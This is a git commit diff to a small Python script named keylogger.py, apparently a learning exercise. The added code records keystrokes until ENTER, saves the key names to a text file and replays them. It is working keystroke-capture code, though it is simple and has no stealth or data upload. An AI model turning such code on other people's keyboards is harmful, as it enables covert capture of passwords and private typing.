e11c50795cbe780259549cf0d315a57ac6db2491
Roberto-coder <61215751+Roberto-coder@users.noreply.github.com>
2024-10-19 00:48:50 -0600

    modificacion keylogger

--- Py/keylogger.py
+++ Py/keylogger.py
@@ -1,3 +1,16 @@
+#import keyboard
+#keys = keyboard.record(until ='ENTER')
+#keyboard.play(keys)
+
 import keyboard
-keys = keyboard.record(until ='ENTER')
+
+# Registrar las teclas hasta que se presione "ENTER"
+keys = keyboard.record(until='ENTER')
+
+# Guardar las teclas registradas en un archivo .txt
+with open('teclas_registradas.txt', 'w') as f:
+    for key in keys:
+        f.write(f"{key.name}\n")
+
+# Reproducir las teclas registradas
 keyboard.play(keys)
